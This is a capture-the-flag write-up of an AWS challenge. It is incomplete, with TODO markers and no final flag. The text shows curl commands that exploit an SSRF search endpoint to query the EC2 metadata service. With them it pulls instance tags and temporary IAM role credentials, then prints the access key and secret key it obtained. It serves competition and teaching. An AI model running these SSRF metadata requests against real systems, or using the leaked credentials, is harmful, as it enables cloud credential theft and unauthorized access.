# CloUDwalker - Cloud Village CTF 2025

## Challenge Overview

CloUDwalker was an AWS cloud security challenge that combined Server-Side Request Forgery (SSRF) exploitation with cloud metadata service access and multi-service AWS reconnaissance.

**Target:** `http://cloud-walker.hexnova.quest:8080/`

## Initial Discovery

### Web Application Analysis
Inspecting the HTML source code revealed a commented-out search form with a telling comment:
```html
<!-- remove search due to ssrf problemss
<form action="/search" method="POST">
  <label for="query">Search:</label>
  <input type="text" id="query" name="query" placeholder="Enter search term" required>
  <button type="submit">Submit</button>
</form>
-->
```

This comment directly hinted at SSRF vulnerabilities and identified the attack vector: a POST endpoint at `/search` with a `query` parameter.

## SSRF Exploitation

### AWS Metadata Service Access
We exploited the SSRF vulnerability to access the AWS metadata service:

```bash
curl -s "http://cloud-walker.hexnova.quest:8080/search" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "query=http://169.254.169.254/latest/meta-data/"
```

This revealed the standard AWS metadata structure, confirming we were running on an EC2 instance.

### Instance Information Gathering
Through SSRF, we extracted critical instance information:
- **Instance ID:** `i-06aa1eec85dfeb4ce`
- **Region:** `eu-north-1` 
- **Account ID:** `101244608939`
- **IAM Role:** `small_phil_role`

### EC2 Tags Analysis
The most crucial discovery came from examining EC2 instance tags:

```bash
curl -s "http://cloud-walker.hexnova.quest:8080/search" \
  -d "query=http://169.254.169.254/latest/meta-data/tags/instance/hex-nova"
```

This returned a hex-encoded message:
```
747269656420746f206869646520626f6d6220636f646520696e20656332207461672e206661696c2e2074726965642077697468696e2065633220696e7374616e63652e206661696c2e20747279696e6720616e6f7468657220736572766963652e2070657469742e0a
```

Decoding this hex revealed:
```
"tried to hide bomb code in ec2 tag. fail. tried within ec2 instance. fail. trying another service. petit."
```

**Key Clues:**
- "bomb code" = flag  
- "petit" (French for "small") = Lambda functions
- Flag was moved from EC2 to "another service"

## AWS Credentials Extraction

### IAM Role Credentials
Through the SSRF, we extracted temporary AWS credentials:

```bash
curl -s "http://cloud-walker.hexnova.quest:8080/search" \
  -d "query=http://169.254.169.254/latest/meta-data/iam/security-credentials/small_phil_role"
```

This provided:
- **AccessKeyId:** `ASIARPEVGEGV5J5FTMNK`
- **SecretAccessKey:** `Ni7BvaY53fa890fmsSOdVSXw2l0cl4Uz4SDgFGRq`  
- **SessionToken:** [long session token]

#TODO: Add the complete solution showing how the Lambda function containing the flag was discovered and accessed, as the notes indicate the challenge was not fully completed

## Security Analysis

### Prowler Scan Results
Using the extracted credentials, we performed security analysis with Prowler:
- Role `small_phil_role` had restrictive permissions with explicit denies
- Both `small_phil_role` and `lambda-exec-role` were vulnerable to confused deputy attacks
- Limited access to most AWS services (Lambda, SSM, Secrets Manager blocked)

### S3 Access
We did gain read access to the `syndicate-uk-database` S3 bucket, which contained what appeared to be a cowsay project repository. Analysis of the README.md revealed:

> "Source code backdoors was good attempt to store the bomb code I discovered but it was too obvious and the Syndicate discovered this too quickly. I am avoiding S3 as a service and will look elsewhere."

This confirmed the flag had been moved from S3 to another AWS service, likely Lambda based on the "petit" clue.

#TODO: Add screenshot of the Prowler scan results showing the IAM policy restrictions

## Key Techniques
- Server-Side Request Forgery (SSRF)
- AWS metadata service exploitation
- Hex decoding and cryptanalysis
- AWS IAM role analysis
- Multi-service cloud enumeration
- Security assessment with Prowler

## Lessons Learned
- SSRF vulnerabilities can provide complete cloud environment access
- Instance metadata contains highly sensitive information
- EC2 tags can be used to store and communicate information
- Proper IAM policies are crucial for limiting blast radius
- Cross-service cloud security requires comprehensive analysis

#TODO: Add the final flag once the Lambda function exploitation is completed